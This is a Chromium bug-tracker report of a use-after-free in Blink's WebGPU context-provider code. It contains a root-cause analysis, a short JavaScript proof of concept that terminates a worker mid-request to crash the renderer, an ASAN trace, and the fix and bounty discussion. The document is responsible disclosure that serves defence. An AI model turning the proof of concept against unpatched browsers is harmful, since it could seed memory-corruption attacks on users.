# Security: UAF in webgpu\gpu.cc in blink::`anonymous namespace'::CreateContextProviderOnMainThread

| Field | Value |
|-------|-------|
| **Issue ID** | [40061370](https://issues.chromium.org/issues/40061370) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Dawn |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | m....@gmail.com |
| **Assignee** | ho...@gmail.com |
| **Created** | 2022-10-16 |
| **Bounty** | $7,000.00 |

## Description

**VERSION**  

WIN10 X64  

commit 12f0eec0b0f1a77d40a82a839db7d8ee41c693b3 (HEAD, origin/main, origin/HEAD)

target\_cpu = "x64"  

dcheck\_always\_on = false  

is\_asan = true  

is\_component\_build = true  

is\_debug = false  

enable\_nacl = false  

symbol\_level=2

**REPRODUCTION CASE**  

chrome --js-flags="--expose-gc --allow-natives-syntax" --no-sandbox --user-data-dir=test --enable-unsafe-webgpu <http://localhost/poc.html>

Type of crash: [tab]

RCA

1. requestAdapter call get call on worker thread
2. EnsureDawnControlClientInitialized use WrapCrossThreadPersistent pass execution\_context
3. WrapCrossThreadPersistent does not guarantee that execution\_context is valid in some cases[2],
4. When worker thread get terminal, execution\_context will get freed

 `https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/modules/webgpu/gpu.cc;drc=4f4aacaf9a0fb85a5212f4de88fb7b03d10db766;l=86 void EnsureDawnControlClientInitialized( ExecutionContext\* execution_context, base::OnceCallback<void(std::unique_ptr<WebGraphicsContext3DProvider>)> callback) { if (IsMainThread()) { const KURL& url = execution_context->Url(); std::move(callback).Run( Platform::Current()->CreateWebGPUGraphicsContext3DProvider(url)); } else { // Posts a task to the main thread to create context provider // because the current RendererBlinkPlatformImpl and viz::Gpu // APIs allow to create it only on the main thread. // When it is created, posts it back to the current thread // and call the callback with it. // TODO(takahiro): Directly create context provider on Workers threads // if RendererBlinkPlatformImpl and viz::Gpu will start to // allow the context provider creation on Workers. PostCrossThreadTask( \*Thread::MainThread()->GetDeprecatedTaskRunner(), FROM_HERE, CrossThreadBindOnce(&CreateContextProviderOnMainThread, WrapCrossThreadPersistent(execution_context), << [1] execution_context->GetTaskRunner(TaskType::kWebGPU), CrossThreadBindOnce(std::move(callback))));` 

`  

<https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/modules/webgpu/gpu.cc;drc=4f4aacaf9a0fb85a5212f4de88fb7b03d10db766;l=58>  

void CreateContextProviderOnMainThread(  

ExecutionContext\* execution\_context,  

scoped\_refptr[base::SingleThreadTaskRunner](javascript:void(0);) task\_runner,  

CrossThreadOnceFunction<void(std::unique\_ptr<WebGraphicsContext3DProvider>)>  

callback) {  

DCHECK(IsMainThread());  

const KURL& url = execution\_context->Url(); << [2]  

PostCrossThreadTask(  

\*task\_runner, FROM\_HERE,  

CrossThreadBindOnce(  

std::move(callback),  

Platform::Current()->CreateWebGPUGraphicsContext3DProvider(url)));  

}

`

POC

<script >
async function runInWorker() {
{
navigator.gpu.requestAdapter().then(x=>{
console.log("GPUAdapter")
x.requestDevice().then(y=>{
console.log("GPUDevice")
})
}).catch((e1)=>{console.log(e1)})
postMessage('');
}
}
let blob = new Blob([`(${runInWorker}())`], {type: "text/javascript"});
let url = URL.createObjectURL(blob);
worker = new Worker(url);
worker.onmessage = () => worker.terminate();
gc();
setTimeout(function(){location.reload();},100)
</script>
# ASAN

[0x==12080==ERROR: AddressSanitizer: access-violation on unknown address 0x7ed300341898 (pc 0x7ffe131e1bdc bp 0x001e7d5fe970 sp 0x001e7d5fe900 T0)  

00007FFE5A06E792+18] (==12080==The signal is caused by a READ memory access.  

D:\chromium\src\base\debug\stack\_trace\_win.cc:329)  

==12080==\*\*\* WARNING: Failed to initialize DbgHelp! \*\*\*  

==12080==\*\*\* Most likely this means that the app is already \*\*\*  

==12080==\*\*\* using DbgHelp, possibly with incompatible flags. \*\*\*  

==12080==\*\*\* Due to technical reasons, symbolization might crash \*\*\*  

==12080==\*\*\* or produce wrong results. \*\*\*  

#0 0x7ffe131e1bdb in blink::`anonymous namespace'::CreateContextProviderOnMainThread D:\chromium\src\third\_party\blink\renderer\modules\webgpu\gpu.cc:63  

#1 0x7ffe131e23d8 in base::internal::Invoker<base::internal::BindState<void (\*)(blink::ExecutionContext \*, scoped\_refptr[base::SingleThreadTaskRunner](javascript:void(0);), WTF::CrossThreadOnceFunction<void (std::Cr::unique\_ptr<blink::WebGraphicsContext3DProvider,std::Cr::default\_delete[blink::WebGraphicsContext3DProvider](javascript:void(0);) >)>),cppgc::internal::BasicCrossThreadPersistent[blink::ExecutionContext,cppgc::internal::StrongCrossThreadPersistentPolicy,cppgc::internal::IgnoreLocationPolicy,cppgc::internal::DisabledCheckingPolicy](javascript:void(0);),scoped\_refptr[base::SingleThreadTaskRunner](javascript:void(0);),WTF::CrossThreadOnceFunction<void (std::Cr::unique\_ptr<blink::WebGraphicsContext3DProvider,std::Cr::default\_delete[blink::WebGraphicsContext3DProvider](javascript:void(0);) >)> >,void ()>::RunOnce D:\chromium\src\base\functional\bind\_internal.h:871  

#2 0x7ffe59f151b9 in base::TaskAnnotator::RunTaskImpl D:\chromium\src\base\task\common\task\_annotator.cc:133  

#3 0x7ffe59f6fd27 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl D:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:441  

#4 0x7ffe59f6eb6d in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork D:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:297  

#5 0x7ffe59dc7c5f in base::MessagePumpDefault::Run D:\chromium\src\base\message\_loop\message\_pump\_default.cc:40  

#6 0x7ffe59f7212d in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run D:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:600  

#7 0x7ffe59e82dce in base::RunLoop::Run D:\chromium\src\base\run\_loop.cc:141  

#8 0x7ffe43300290 in content::RendererMain D:\chromium\src\content\renderer\renderer\_main.cc:313  

#9 0x7ffe43827cb8 in content::RunOtherNamedProcessTypeMain D:\chromium\src\content\app\content\_main\_runner\_impl.cc:752  

#10 0x7ffe43829ee4 in content::ContentMainRunnerImpl::Run D:\chromium\src\content\app\content\_main\_runner\_impl.cc:1104  

#11 0x7ffe43825570 in content::RunContentProcess D:\chromium\src\content\app\content\_main.cc:342  

#12 0x7ffe43826190 in content::ContentMain D:\chromium\src\content\app\content\_main.cc:370  

#13 0x7ffe47eb14bd in ChromeMain D:\chromium\src\chrome\app\chrome\_main.cc:175  

#14 0x7ff7081c514a in MainDllLoader::Launch D:\chromium\src\chrome\app\main\_dll\_loader\_win.cc:166  

#15 0x7ff7081c28b1 in main D:\chromium\src\chrome\app\chrome\_exe\_main\_win.cc:391  

#16 0x7ff708487717 in \_\_scrt\_common\_main\_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe\_common.inl:288  

#17 0x7ffeb4327033 in BaseThreadInitThunk+0x13 (C:\WINDOWS\System32\KERNEL32.DLL+0x180017033)  

#18 0x7ffeb45226a0 in RtlUserThreadStart+0x20 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x1800526a0)

==12080==First 16 instruction bytes at pc: 48 03 11 48 89 d0 48 c1 e8 03 42 80 3c 30 00 0f  

AddressSanitizer can not provide additional info.  

SUMMARY: AddressSanitizer: access-violation D:\chromium\src\third\_party\blink\renderer\modules\webgpu\gpu.cc:63 in blink::`anonymous namespace'::CreateContextProviderOnMainThread  

==12080==ABORTING

## Attachments

- [poc.html](attachments/poc.html) (text/plain, 579 B)
- [ASAN.txt](attachments/ASAN.txt) (text/plain, 3.5 KB)
- [poc.html](attachments/poc.html) (text/plain, 342 B)
- [fix.patch](attachments/fix.patch) (text/plain, 1.9 KB)

## Timeline

### m....@gmail.com (2022-10-16)

Background:

Similar to the 1299743 I reported earlier
https://bugs.chromium.org/p/chromium/issues/detail?id=1299743

https://source.chromium.org/chromium/chromium/src/+/main:v8/include/cppgc/cross-thread-persistent.h;drc=8d399817282e3c12ed54eb23ec42a5e418298ec6;l=18
// Wrapper around PersistentBase that allows accessing poisoned memory when
// using ASAN. This is needed as the GC of the heap that owns the value
// of a CTP, may clear it (heap termination, weakness) while the object		<<[2]
// holding the CTP may be poisoned as itself may be deemed dead.
class CrossThreadPersistentBase : public PersistentBase {

```

### [Deleted User] (2022-10-16)

[Empty comment from Monorail migration]

### m....@gmail.com (2022-10-16)

Bisect:

Introduce by this CL
https://chromium-review.googlesource.com/c/chromium/src/+/3874500


### m....@gmail.com (2022-10-16)

Smaller and more reproducible POC

### m....@gmail.com (2022-10-16)

PATCH
Directly pass KURL as parameter instead of ExecutionContext

### jd...@chromium.org (2022-10-18)

enga@: Can you please take a look?

I'm not entirely certain of the current shipping status of Dawn. Assuming it's enabled in some cases (e.g. an OT).

[Monorail components: Internals>GPU>Dawn]

### [Deleted User] (2022-10-18)

[Empty comment from Monorail migration]

### en...@chromium.org (2022-10-18)

Will revert the problematic CL.

### en...@chromium.org (2022-10-18)

[Empty comment from Monorail migration]

### en...@chromium.org (2022-10-18)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-18)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-10-18)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-10-18)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### en...@chromium.org (2022-10-19)

Marking fixed now that the revert has landed so the bots can create the merge labels.

### [Deleted User] (2022-10-19)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-19)

[Empty comment from Monorail migration]

### ho...@gmail.com (2022-10-20)

Thanks for catching up a security issue I have added.

I'm investigating how to avoid the problem. A solution may be either one?

1. Somehow ensure the worker thread is alive until the pointer is accessed
2. Somehow check the pointer is alive
3. Somehow make a copy of the URL and pass the value from a worker to main thread

I'm still new to C++ and Chromium thread programming. I'm happy if someone gives me advices.


### m....@gmail.com (2022-10-20)

I see that there seem to be some recent changes to CTP usage that might help you
https://bugs.chromium.org/p/chromium/issues/detail?id=1370013

### ho...@gmail.com (2022-10-25)

Thanks for the advice. But in my case CrossThreadHandle didn't work because an object needs to be accessed on the thread other than the threat the object is created on. (An object is created on Worker thread and it is accessed on the main thread.)

Instead I'm trying to make a copy and move a unique pointer.

I made a CL

https://chromium-review.googlesource.com/c/chromium/src/+/3974333

I wanted to try to locally build Chrome again with the arguments posted in the first comment and run the POC test but no disk space to build another Chrome binary on my machine. (And no time because Chrome build takes half or full day on my machine.) Is it possible to run the POC test on the (Gerrit?) server?

### am...@google.com (2022-11-03)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-11-03)

Congratulations on a third one this week! The VRP Panel has decided to award you $7,000 for this report + $1,000 bisect bonus. Nice work! Thank you for your efforts in discovering and reporting this issue to us! 

### am...@google.com (2022-11-04)

[Empty comment from Monorail migration]

### ho...@gmail.com (2022-11-06)

I built the binary and ran the test locally. I confirmed that the new implementation seems to resolve the problem. Thanks, all.

https://chromium-review.googlesource.com/c/chromium/src/+/3974333

### [Deleted User] (2022-11-12)

This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M109. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-12)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), eakpobaro (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2022-11-14)

Hi hogehoge@ your CL in https://crbug.com/chromium/1375088#c23 appears to still be active. Do you have an ETA on when that CL will be landed?

### ho...@gmail.com (2022-11-14)

I guess at the latest in a few weeks? We ware waiting for the review from Ken. The CL can land once the review will have been done.

### en...@chromium.org (2022-11-15)

Re https://crbug.com/chromium/1375088#c26:

This issue is already fixed with the revert which is already in M109.
https://chromiumdash.appspot.com/commit/2df87c613536e095aa2ec8745c8f89552b14f142

Apologies when I created the revert, it didn't link to this bug.

### am...@chromium.org (2022-11-15)

thank you both, hogeghoge.gachapin@ and enga@ 

### am...@chromium.org (2022-11-17)

forgot to remove merge label

### [Deleted User] (2023-01-25)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1375088?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061370)*
